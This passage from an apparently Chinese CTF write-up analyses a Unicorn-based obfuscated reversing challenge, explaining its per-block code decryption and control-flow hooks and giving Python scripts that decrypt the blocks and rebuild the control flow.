支持很多种回调类型，当 Unicorn 运行的代码满足特定的条件时，将触发对应的回调。</p><p>在回调中可以对虚拟机中环境上下文操作，类似调试器的调试回调。 </p><p>本题借助 Unicorn 指令回调，实现指令即时解密，执行后重新加密，打乱控制流。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 虚拟机输入接口，虚拟机代码中的 in 指令</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">2</span>, input + <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0xDA</span>u);<span class="hljs-comment">// 2 == UC_HOOK_INSN</span><br><span class="hljs-comment">// 虚拟机输出接口，虚拟机中代码中的 out 指令处理</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">2</span>, output, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0x1F4</span>u);<span class="hljs-comment">// 2 = UC_HOOK_INSN</span><br><span class="hljs-comment">// 虚拟机中 syscall 指令处理，设置 rax 寄存器的值为 time(0)</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">2</span>, syscall_time, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0x2BB</span>u);<span class="hljs-comment">// 2 = UC_HOOK_INSN</span><br><span class="hljs-comment">// 虚拟机中 fs 内存访问处理，改变 fs:0 的值，关键算法部分很重要</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">1024</span>, changeKey, <span class="hljs-number">0LL</span>, <span class="hljs-number">0x66660000</span>LL, <span class="hljs-number">0x66661000</span>LL, v4);<span class="hljs-comment">// UC_HOOK_MEM_READ</span><br><span class="hljs-comment">// 代码解密回调</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">8</span>, decrypt, &amp;v21, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, v5);<span class="hljs-comment">// UC_HOOK_BLOCK</span><br><span class="hljs-comment">// 代码控制流控制回调1</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">0x4000</span>,  ControlFlow1, &amp;v21, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, v6);<span class="hljs-comment">// UC_HOOK_INSN_INVALID</span><br><span class="hljs-comment">// 代码控制流控制回调2</span><br>uc_hook_add(v14, &amp;trace, <span class="hljs-number">4</span>,  ControlFlow2, &amp;v21, <span class="hljs-number">0x10A3</span>LL, <span class="hljs-number">0x10A4</span>LL, v7);<span class="hljs-comment">// UC_HOOK_CODE</span><br></code></pre></td></tr></table></figure><p>注意控制流有两个控制回调，第二个控制回调只在 0x10A3 地址处有效，就是特殊处理的地址。</p><h2 id="3-代码解密分析"><a href="#3-代码解密分析" class="headerlink" title="3. 代码解密分析"></a>3. 代码解密分析</h2><p>代码解密的主要逻辑在 decrypt 函数，该函数解密当前即将执行的基本块，加密上一个执行完的基本块</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">v9 = miniDec(lastKey, entry_rip);<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">85</span>; ++i )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( v9 == *&amp;size_table[<span class="hljs-number">8</span> * i] )<br>  &#123;<br>    size[<span class="hljs-number">0</span>] = *&amp;size_table[<span class="hljs-number">8</span> * i + <span class="hljs-number">4</span>];        <span class="hljs-comment">// getlen</span><br>    v12 = <span class="hljs-built_in">malloc</span>(size[<span class="hljs-number">0</span>]);<br>    uc_mem_read(v5, addr, v12, size[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; size[<span class="hljs-number">0</span>] &gt; j; ++j )<br>      ;<br>    dec1(v12, size[<span class="hljs-number">0</span>], lastKey);<br>    uc_mem_write(v5, addr, v12, size[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; size[<span class="hljs-number">0</span>] &gt; k; ++k )<br>      ;<br>    <span class="hljs-built_in">free</span>(v12);<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>) = addr;<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">12LL</span>) = **&amp;size[<span class="hljs-number">1</span>];<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>) = size[<span class="hljs-number">0</span>];<br>    *(*&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">16LL</span>) = addr;<br>    uc_reg_write(v5, <span class="hljs-number">41</span>, &amp;addr);              <span class="hljs-comment">// UC_X86_REG_RIP</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>基本块密钥用 miniDec 函数计算，参数为上一个基本块的入口密钥 lastKey 与当前基本块入口 rip, minidec 函数如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">miniDec</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> a2 ^ a1 ^ (a2 * a1) ^ (a1 + a2);<br>&#125;<br></code></pre></td></tr></table></figure><p>size_table 是一个数组，该数组保存了基本块密钥与基本块大小的关系，元素结构如下</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs processing">dd <span class="hljs-built_in">key</span><br>dd <span class="hljs-built_in">size</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">size_table = [<span class="hljs-number">0x02F73020</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x09D3473A</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x0EF87B55</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x147CB028</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x15F833AA</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x17086780</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x1733A9D4</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x17D61EE8</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x1D52F19E</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x1F732DE0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x1FBECFAD</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x245BD7C8</span>, <span class="hljs-number">0x00000055</span>, <span class="hljs-number">0x25E7ABEE</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x2882C190</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x2A2084A0</span>, <span class="hljs-number">0x00000075</span>, <span class="hljs-number">0x326AA6AE</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x33074A36</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x3440BD69</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x362A1FC3</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x3C0450D0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x3CB575FD</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x41B3B26E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x46005120</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x465A72CF</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x492145A0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x49AA4CE0</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x4BD63647</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x4BF84A87</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x4D102445</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x4D4D3C55</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x53723232</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x5809B5CB</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x5B12FFCE</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x5B1F3000</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5D9FBD20</span>, <span class="hljs-number">0x00000027</span>, <span class="hljs-number">0x6219EED9</span>, <span class="hljs-number">0x0000008A</span>, <span class="hljs-number">0x65D82D17</span>, <span class="hljs-number">0x0000004C</span>, <span class="hljs-number">0x67F5671A</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x6CE2CBC1</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x718A739C</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x71A62DD7</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x7693A1F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x7A473FB0</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x7AEFEDDC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x7AF2CF90</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x7BE0B8B0</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x80EB3E88</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x8213506A</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x82468114</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x86B872A2</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x87FBD296</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x88719339</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x89E2630A</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x8CB6536E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x92316E00</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x9415A51E</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x94D658E0</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x97E8DFCD</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x992E3874</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x9B06958D</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x9B36B480</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xA03CEFAD</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0xA39F47E6</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0xA946DEC4</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xAE6173DC</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0xB044A68D</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0xB29E36A8</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0xB82781F4</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xC14DFAF8</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xC3F42E20</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0xC5E0065E</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0xCAD68B21</span>, <span class="hljs-number">0x00000039</span>, <span class="hljs-number">0xCBF29AC7</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xCE8729BC</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xD2A85A94</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0xD34FA4F3</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xD64611B0</span>, <span class="hljs-number">0x00000058</span>, <span class="hljs-number">0xD814FD56</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0xDD386A80</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0xDE82DFAC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xEC68D16F</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xEEDE845B</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0xF235F260</span>, <span class="hljs-number">0x0000008D</span>, <span class="hljs-number">0xF9AA1F0B</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0xFC200887</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xFED657A3</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>]<br></code></pre></td></tr></table></figure><p>奇数下标数据为key，偶数为基本块字节的长度。</p><p>用 python 实现基本块解密函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuck</span>(<span class="hljs-params">prev_key, rip</span>):</span><br>    <span class="hljs-keyword">return</span> rip ^ prev_key ^ ((rip * prev_key) &amp; <span class="hljs-number">0xffffffff</span>) ^ (prev_key + rip)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deXor</span>(<span class="hljs-params">data, key</span>):</span><br>    key = p32(key)<br>    data = <span class="hljs-built_in">bytearray</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        data[i] ^=  key[i % <span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt_block</span>(<span class="hljs-params">key, rip</span>):</span><br>    key2 = fuck(key, rip)<br>    blockSize = get_size(key2)<br>    <span class="hljs-keyword">if</span> blockSize <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        print(<span class="hljs-string">&quot;Not found1: rip:%x key:%x&quot;</span> % (rip, key2))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    offset = rip - <span class="hljs-number">0x1000</span><br>    code_data = code_bin[offset: offset + blockSize]<br>    code_data = deXor(code_data, key)<br>    next_rip = rip + blockSize - <span class="hljs-number">2</span><br>    key2 = fuck(key, next_rip)<br>    jmps = get_jmps(key2)<br>    <span class="hljs-keyword">return</span> code_data, jmps, next_rip<br></code></pre></td></tr></table></figure><p>这里的部分代码还涉及控制流重建，后面会提到。</p><h2 id="4-控制流分析"><a href="#4-控制流分析" class="headerlink" title="4. 控制流分析"></a>4. 控制流分析</h2><p>ControlFlow1 回调，执行到无效指令会被调用，用于切换程序中的控制流。</p><p>该题用 <code>3f 0f </code>作为基本块的结尾（无效指令）触发 ControlFlow1 回调，切换控制流。</p><p>ControlFlow1 回调函数根据结尾 rip 与 当前基本块的 key 计算另外一个 key，用于索引当前基本块的后继基本块的信息。</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613220614232.png" class="" title="image-20210613220614232"><p>flowInfo 是一个数组，每一个元素有如下5个字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dd</span> key<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">0</span>_jmp  当基本块结尾 zf 标志寄存器为 <span class="hljs-number">0</span> 的跳转偏移，下面同理<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">0</span>_key<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">1</span>_jmp<br><span class="hljs-attribute">dd</span> zf_<span class="hljs-number">1</span>_key<br></code></pre></td></tr></table></figure><p>根据 zf 标志位跳转</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613222926881.png" class="" title="image-20210613222926881"><p>注意 v9 保存的是上一个基本块的 key，此处做的 += 运算，即上一个基本块的 key 与 下一个基本块的 key 有关联。</p><p>由此可见，基本块的 key 与控制流的路径有关！写解密脚本的时候要考虑路径问题。</p><p>另外，当虚拟机中程序运行到 0x10A3 时将调整控制流并更改 key</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614135822676.png" class="" title="image-20210614135822676"><p>解密后的基本块，很多都是以读取 fs 寄存器并判断结尾</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614140832827.png" class="" title="image-20210614140832827"><p>r15 的值来源于 fs:xxx ，最后再与 fs:xxx 内存的值比较，很明显最后的 zf = 1。</p><p>其实并不是，这道题对 fs 寄存器指向的那段内存做了内存读回调，回调如下</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614141153126.png" class="" title="image-20210614141153126"><p>每次读取 fs 指向的内存，该内存的值都会被改写。所以 mov 与 cmp 对 fs 内存访问出的结果是不同的，自然 zf = 0，走 zf = 0 的分支。</p><p>在控制流重建的时候，需要考虑以读取 fs 内存结尾的基本块，将其看作是无条件跳转，而不是 jz/jnz。</p><h2 id="5-控制流重建"><a href="#5-控制流重建" class="headerlink" title="5. 控制流重建"></a>5. 控制流重建</h2><p>重建思路：</p><p>以 bfs 遍历顺序，从入口基本块开始解密，解密后再查询分支信息表获取后继基本块的相对偏移与key，最后将新基本块的信息加入到队列，等待分析。遍历时注意维护路径上的 key 累计值。</p><p>所有基本块解密完成后，可以得到每个基本块的后继基本块的相对偏移。</p><p>要在基本块的结尾插入跳转指令，这将改变代码布局，使得原始相对偏移不可用，所以我采取重编译来解决这个问题，重编译之前将原始基本块的入口地址作为基本的符号名，基本块结尾用 jmp/jz 等指令连接。</p><p>code.bin 文件时 dump 出来的原始 code 数据，输出 1.bin 可以直接在 ida 中反编译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> keystone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>fuckTable = [<span class="hljs-number">0x00412F5E</span>, <span class="hljs-number">0xFFFFFA22</span>, <span class="hljs-number">0x14252652</span>, <span class="hljs-number">0xFFFFF9AC</span>, <span class="hljs-number">0x66CEF8EC</span>, <span class="hljs-number">0x0251D934</span>, <span class="hljs-number">0x0000009F</span>, <span class="hljs-number">0xC56FBF59</span>, <span class="hljs-number">0xFFFFFF61</span>, <span class="hljs-number">0xAA4D5B7C</span>, <span class="hljs-number">0x02745896</span>, <span class="hljs-number">0xFFFFFB7F</span>, <span class="hljs-number">0x34B6D31E</span>, <span class="hljs-number">0xFFFFFBB0</span>, <span class="hljs-number">0x302CC828</span>, <span class="hljs-number">0x02AC5992</span>, <span class="hljs-number">0xFFFFF524</span>, <span class="hljs-number">0x67CC4064</span>, <span class="hljs-number">0xFFFFF483</span>, <span class="hljs-number">0x8A5D9B26</span>, <span class="hljs-number">0x046254D0</span>, <span class="hljs-number">0xFFFFFC37</span>, <span class="hljs-number">0x074AB936</span>, <span class="hljs-number">0xFFFFFC7F</span>, <span class="hljs-number">0xB8EA37F7</span>, <span class="hljs-number">0x0CACD9FE</span>, <span class="hljs-number">0x0000007F</span>, <span class="hljs-number">0x6112F222</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x47A72561</span>, <span class="hljs-number">0x0F0FE6EB</span>, <span class="hljs-number">0xFFFFFBAE</span>, <span class="hljs-number">0x0A1411E7</span>, <span class="hljs-number">0xFFFFFC85</span>, <span class="hljs-number">0x3BE88B46</span>, <span class="hljs-number">0x0FC59DC2</span>, <span class="hljs-number">0xFFFFF72F</span>, <span class="hljs-number">0x7D12A5EF</span>, <span class="hljs-number">0xFFFFF691</span>, <span class="hljs-number">0xE67393D6</span>, <span class="hljs-number">0x10B1EBCA</span>, <span class="hljs-number">0x000001CF</span>, <span class="hljs-number">0x473A1295</span>, <span class="hljs-number">0x0000022E</span>, <span class="hljs-number">0x7BC15385</span>, <span class="hljs-number">0x1565D41D</span>, <span class="hljs-number">0xFFFFFDC4</span>, <span class="hljs-number">0x05D337BE</span>, <span class="hljs-number">0xFFFFFE7E</span>, <span class="hljs-number">0xE12982E4</span>, <span class="hljs-number">0x18909E40</span>, <span class="hljs-number">0x000005EB</span>, <span class="hljs-number">0xAE2337AF</span>, <span class="hljs-number">0x000005B1</span>, <span class="hljs-number">0x8E0AB2ED</span>, <span class="hljs-number">0x1AE7593A</span>, <span class="hljs-number">0xFFFFF3BC</span>, <span class="hljs-number">0x23E9058D</span>, <span class="hljs-number">0xFFFFF40B</span>, <span class="hljs-number">0xDFA6CF3E</span>, <span class="hljs-number">0x1B47DA81</span>, <span class="hljs-number">0xFFFFF8C3</span>, <span class="hljs-number">0x349CC616</span>, <span class="hljs-number">0xFFFFF7E9</span>, <span class="hljs-number">0x70C290D0</span>, <span class="hljs-number">0x1D816435</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x43F999C9</span>, <span class="hljs-number">0xFFFFFFD8</span>, <span class="hljs-number">0xAB0BCA16</span>, <span class="hljs-number">0x1DACC905</span>, <span class="hljs-number">0xFFFFFF54</span>, <span class="hljs-number">0x5C129962</span>, <span class="hljs-number">0xFFFFFD06</span>, <span class="hljs-number">0xE4515A41</span>, <span class="hljs-number">0x1E03B13C</span>, <span class="hljs-number">0xFFFFFF80</span>, <span class="hljs-number">0x7E763806</span>, <span class="hljs-number">0xFFFFF36A</span>, <span class="hljs-number">0xA25F3D93</span>, <span class="hljs-number">0x22FEFC06</span>, <span class="hljs-number">0xFFFFFCDD</span>, <span class="hljs-number">0xB94E0C2F</span>, <span class="hljs-number">0xFFFFFCB6</span>, <span class="hljs-number">0xF023033D</span>, <span class="hljs-number">0x26B1E690</span>, <span class="hljs-number">0xFFFFFDAB</span>, <span class="hljs-number">0xD0C7ED0C</span>, <span class="hljs-number">0xFFFFFE9B</span>, <span class="hljs-number">0xD49872C6</span>, <span class="hljs-number">0x2A652084</span>, <span class="hljs-number">0x000001EA</span>, <span class="hljs-number">0xDF9B65EE</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5CC5AB90</span>, <span class="hljs-number">0x2FBEBD25</span>, <span class="hljs-number">0x0000048F</span>, <span class="hljs-number">0x60A4E9F2</span>, <span class="hljs-number">0x000009AF</span>, <span class="hljs-number">0x42FE8B0D</span>, <span class="hljs-number">0x34F12D90</span>, <span class="hljs-number">0x000004C0</span>, <span class="hljs-number">0xF6257D94</span>, <span class="hljs-number">0x00000480</span>, <span class="hljs-number">0x5227DE21</span>, <span class="hljs-number">0x35F591D0</span>, <span class="hljs-number">0xFFFFFCA1</span>, <span class="hljs-number">0xDA83E113</span>, <span class="hljs-number">0xFFFFF998</span>, <span class="hljs-number">0x805C7ECB</span>, <span class="hljs-number">0x37EB0B72</span>, <span class="hljs-number">0xFFFFF3EC</span>, <span class="hljs-number">0x7480201A</span>, <span class="hljs-number">0xFFFFF903</span>, <span class="hljs-number">0xAC977E11</span>, <span class="hljs-number">0x389A58A8</span>, <span class="hljs-number">0x00000189</span>, <span class="hljs-number">0xE4005CD7</span>, <span class="hljs-number">0xFFFFFDEC</span>, <span class="hljs-number">0xB043695F</span>, <span class="hljs-number">0x3CB24155</span>, <span class="hljs-number">0x0000084C</span>, <span class="hljs-number">0x8ACB6FF1</span>, <span class="hljs-number">0x00000899</span>, <span class="hljs-number">0xACB471A5</span>, <span class="hljs-number">0x3DCBCDE3</span>, <span class="hljs-number">0x000007A8</span>, <span class="hljs-number">0xA84E3072</span>, <span class="hljs-number">0x00000384</span>, <span class="hljs-number">0xB2624259</span>, 